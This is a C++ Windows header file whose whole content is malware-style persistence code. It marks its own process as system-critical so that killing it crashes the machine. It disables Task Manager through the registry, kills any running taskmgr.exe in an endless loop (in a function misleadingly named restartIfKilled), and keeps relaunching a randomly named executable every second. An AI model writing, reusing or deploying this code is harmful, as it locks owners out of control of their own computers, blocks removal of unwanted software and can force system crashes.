#pragma once

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);


BOOL EnablePriv(LPCWSTR lpszPriv) {
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));


	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;


	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}


	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;


	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}


BOOL ProcessIsCritical() {
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;


	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{

		EnablePriv(SE_DEBUG_NAME);


		fSetCritical = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");


		if (!fSetCritical) {
			CloseHandle(hDLL);
			return FALSE;
		}


		fSetCritical(1, 0, 0);

		CloseHandle(hDLL);
		return TRUE;
	}
	else {
		return FALSE;
	}
}


void disableTaskManager() {
	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey);
	DWORD value = 1;
	RegSetValueEx(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
	RegCloseKey(hKey);
}


void restartIfKilled() {
	while (true) {
		Sleep(1000); 

		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(hSnap, &pe32)) {
			do {
				if (wcscmp(pe32.szExeFile, L"taskmgr.exe") == 0) {
					TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID), 0);
				}
			} while (Process32Next(hSnap, &pe32));
		}
		CloseHandle(hSnap);
	}
}


void watchdogLoop() {
	while (true) {
		system("start lGyciQRsgA.exe");
		Sleep(1000);
	}
}

void crashProofMain() {
	disableTaskManager();
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)restartIfKilled, 0, 0, 0);
	ProcessIsCritical();
	watchdogLoop();
}
